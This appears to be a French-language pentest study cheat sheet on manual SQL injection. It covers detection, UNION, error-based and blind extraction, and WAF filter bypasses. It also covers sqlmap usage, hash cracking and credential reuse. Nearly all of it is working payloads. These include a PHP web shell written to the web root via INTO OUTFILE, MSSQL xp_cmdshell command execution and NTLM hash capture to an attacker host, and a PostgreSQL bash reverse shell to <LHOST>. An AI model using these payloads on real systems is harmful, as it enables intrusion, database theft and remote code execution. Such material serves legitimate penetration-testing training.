# 09 — SQL Injection Attacks

## Objectifs
Exploiter une SQLi **manuellement** (UNION, error-based, blind), puis escalader vers la lecture de fichiers ou l'exécution de commandes. sqlmap est un accélérateur, pas une béquille — et parfois interdit par le WAF.

---

## 1. Détection

```bash
# Tests de base sur un paramètre
'                     # erreur SQL ?
''                    # erreur disparaît → injectable
' OR 1=1-- -          # retour à la normale
' AND 1=1-- -  vs  ' AND 1=2-- -
"  )  ')  ;-- -       # variantes de contexte
```

```bash
curl -s "http://<TARGET>/item?id=1'"
curl -s "http://<TARGET>/item?id=1'%20OR%20'1'='1"
curl -s "http://<TARGET>/item?id=1 AND 1=1"
curl -s "http://<TARGET>/item?id=1 AND 1=2"
```

Indices : erreur SQL, contenu différent, page vide, redirection, délai.

### Contexte d'injection
| Requête probable | Payload |
|---|---|
| `WHERE id = '$in'` | `' OR 1=1-- -` |
| `WHERE id = $in` (numérique) | `1 OR 1=1-- -` |
| `WHERE name = "$in"` | `" OR 1=1-- -` |
| `WHERE id IN ($in)` | `1) OR 1=1-- -` |
| `LIKE '%$in%'` | `' OR 1=1-- -` |

---

## 2. Déterminer le nombre de colonnes

```bash
# ORDER BY incrémental
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -     # erreur au-delà du nombre de colonnes

# UNION NULL
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

---

## 3. UNION-based (le plus rapide)

```bash
# Trouver les colonnes affichées
' UNION SELECT 1,2,3-- -
' UNION SELECT 'a','b','c'-- -

# Version et base
' UNION SELECT 1,version(),database()-- -
' UNION SELECT 1,user(),@@version-- -          # MySQL
' UNION SELECT 1,@@version,db_name()-- -       # MSSQL

# Tables et colonnes (MySQL)
' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables WHERE table_schema=database()-- -
' UNION SELECT 1,group_concat(column_name),3 FROM information_schema.columns WHERE table_name='users'-- -

# Données
' UNION SELECT 1,group_concat(username,0x3a,password),3 FROM users-- -
```

### MSSQL
```sql
' UNION SELECT 1,name,3 FROM sys.databases-- -
' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -
' UNION SELECT 1,COLUMN_NAME,3 FROM information_schema.columns WHERE TABLE_NAME='users'-- -
```

### PostgreSQL
```sql
' UNION SELECT 1,string_agg(table_name,','),3 FROM information_schema.tables-- -
```

### Oracle
```sql
' UNION SELECT 1,table_name,3 FROM all_tables-- -
' UNION SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS'-- -
```

> Concaténation : MySQL `CONCAT(a,b)` / `0x3a`, MSSQL `a+b`, PostgreSQL `a||b`, Oracle `a||b`.

---

## 4. Error-based (quand UNION est aveugle)

```sql
-- MySQL
' AND extractvalue(1,concat(0x7e,(SELECT database())))-- -
' AND updatexml(1,concat(0x7e,(SELECT version())),1)-- -

-- MSSQL
' AND 1=CONVERT(int,(SELECT @@version))-- -

-- PostgreSQL
' AND 1=CAST((SELECT version()) AS int)-- -
```

---

## 5. Blind boolean

```bash
# Vrai / faux comparés par le contenu de la page
' AND SUBSTRING((SELECT database()),1,1)='a'-- -
' AND ASCII(SUBSTRING((SELECT database()),1,1))>97-- -
```

Script manuel (exemple) :
```python
import requests, string
url = "http://<TARGET>/item?id=1"
res = ""
for i in range(1, 40):
    for ch in string.printable:
        p = f"' AND SUBSTRING((SELECT database()),{i},1)='{ch}'-- -"
        r = requests.get(url, params={"id": p}, timeout=5)
        if "Welcome" in r.text:          # marqueur de "vrai"
            res += ch
            break
    print(res)
```

---

## 6. Blind time-based

```sql
-- MySQL
' AND IF(SUBSTRING(database(),1,1)='a',SLEEP(3),0)-- -
' AND SLEEP(3)-- -
-- MSSQL
'; IF (SELECT COUNT(*) FROM users)>0 WAITFOR DELAY '0:0:3'-- -
-- PostgreSQL
'; SELECT CASE WHEN (1=1) THEN pg_sleep(3) ELSE pg_sleep(0) END-- -
```

```bash
time curl -s "http://<TARGET>/item?id=1'%20AND%20SLEEP(3)--%20-"
```

---

## 7. Écriture / lecture de fichiers

```sql
-- MySQL : lecture
' UNION SELECT 1,LOAD_FILE('/etc/passwd'),3-- -

-- MySQL : écriture (si FILE privilege + secure_file_priv vide)
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
' UNION SELECT 1,'<?php system($_GET["c"]); ?>',3 INTO DUMPFILE '/var/www/html/shell.php'-- -
```

```sql
-- MSSQL : lecture
' UNION SELECT 1,BulkColumn,3 FROM OPENROWSET(BULK '/etc/passwd',SINGLE_CLOB) AS x-- -

-- MSSQL : RCE via xp_cmdshell
'; EXEC sp_configure 'show advanced options',1; RECONFIGURE;-- -
'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;-- -
'; EXEC xp_cmdshell 'whoami'-- -
```

```sql
-- MSSQL : capture de hash (SMB sortant)
'; EXEC master..xp_dirtree '\\<LHOST>\share'-- -
-- Écouter : responder -I tun0 -v   ou   impacket-smbserver share /tmp -smb2support
```

```sql
-- PostgreSQL : RCE
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/<LHOST>/4444 0>&1"';-- -
```

---

## 8. WAF et filtres

| Filtre | Contournement |
|---|---|
| `UNION SELECT` bloqué | `UNION/**/SELECT`, `uNiOn SeLeCt`, `UNION%0aSELECT` |
| Espaces bloqués | `/**/`, `%09`, `%0a`, `()` |
| Quotes bloquées | injection numérique, `0x...`, `CHAR()` |
| `--` bloqué | `#`, `-- -`, `;%00` |
| Mots-clés bloqués | `SEL/**/ECT`, casse alternée |

```bash
# Encodage automatique côté sqlmap
sqlmap -u "http://<TARGET>/item?id=1" --tamper=space2comment,between
```

---

## 9. sqlmap (quand c'est autorisé)

```bash
# Détection de base
sqlmap -u "http://<TARGET>/item?id=1" --batch

# Requête POST / cookie / header
sqlmap -u "http://<TARGET>/login" --data="user=a&pass=b" --batch --level=5 --risk=3
sqlmap -u "http://<TARGET>/item?id=1" --cookie="PHPSESSID=abc" --batch

# Énumération
sqlmap -u "..." --dbs
sqlmap -u "..." -D <DB> --tables
sqlmap -u "..." -D <DB> -T users --columns
sqlmap -u "..." -D <DB> -T users -C username,password --dump

# Shell
sqlmap -u "..." --os-shell
sqlmap -u "..." --os-pwn          # via Metasploit (⚠ quota MSF)

# Fichier
sqlmap -u "..." --file-read=/etc/passwd
sqlmap -u "..." --file-write=shell.php --file-dest=/var/www/html/shell.php

# Requête capturée dans Burp
sqlmap -r request.txt --batch
```

Options clés : `--batch`, `--level`/`--risk`, `--dbms`, `--technique=U`, `--threads 5`, `--output-dir`.

---

## 10. Après le dump

1. **Cracker les hashes**
   ```bash
   hashcat -m 0 hashes.txt rockyou.txt          # MD5
   hashcat -m 100 hashes.txt rockyou.txt        # SHA1
   hashcat -m 1400 hashes.txt rockyou.txt       # SHA256
   hashcat -m 3200 hashes.txt rockyou.txt       # bcrypt
   john --wordlist=rockyou.txt hashes.txt
   ```
2. **Réutiliser** les creds sur SSH, SMB, WinRM, admin panel.
3. **Tester** les rôles élevés.
4. **Documenter** la requête et la sortie exactes (preuve).

---

## 11. Checklist

- [ ] Contexte de l'injection identifié (quote/number)
- [ ] Nombre de colonnes déterminé
- [ ] Colonnes affichées identifiées
- [ ] Version + base + utilisateur
- [ ] Tables sensibles listées
- [ ] Hashs dumpés + crackés
- [ ] Fichier lu ou écrit (si privilèges)
- [ ] Creds réutilisés ailleurs
- [ ] Preuve (requête + sortie) sauvegardée
